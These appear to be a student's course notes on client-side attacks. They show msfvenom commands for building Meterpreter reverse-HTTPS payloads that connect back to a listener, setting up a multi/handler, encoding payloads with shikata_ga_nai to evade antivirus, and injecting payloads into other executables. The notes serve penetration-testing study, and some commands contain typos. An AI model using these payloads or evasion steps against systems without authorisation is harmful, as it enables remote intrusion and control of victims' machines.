involves coercing the a client to execute a malicious payload on their system that connects back to the attacker when executed

normally utilize a form of social engineering and take advanctage of human vulnerabilities as opposed to vulns in services or softwares

attackers must be cognisant of AV detection and evasion

generate payloads - msfvenom

https://github.com/frizb/MSF-Venom-Cheatsheet
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

For this course we primarily will be created meterpreter payloads.

staged: 
will be named as such:
OS/xarc/meterpreter/proto_col
ex. windows/x64/meterpreter/reverse_https

nonstaged:
will be named as such:
os/xarc/meterpreter_proto_col
ex. windows/x64/meterpreter_reverse_https

generating a payload 

msfvenom -a xarch -p os/xarc/meterpreter_proto_col LHOST=lhost.addr LPORT=1337 -f .ext > /path/to/storefile/filename.ext

ex.
msfvenom -a x64 -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=1337 -f .exe ? /home/payloads/shell.exe

then to configure your listener

use multi/hander
set payload (match payload you created.

then set your options to match what you configured in msfvenom

encoding payloads is required to bypass AV detection (signature based detection)

you can encode the payload with the -e tag in msfvenom. The more iterations of encoding you perform the more successful your masking will be.

example
msfvenom -a x86 -p windows/x86/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=1337 -i 10 -e x86/shikata_ga_nai -f .exe ? /home/payloads/shell.exe

To inject your payload into another executable you can use the -x tag. You can also use the -k opton that will keep the original functionality of the executable. This won't work for many portable executables only select ones but this feature has limited functionality.

You can automate repetitive tasks with resource scripts: 

https://docs.rapid7.com/metasploit/resource-scripts/

default location in kali is /usr/share/metasploit-framework/scripts/resource
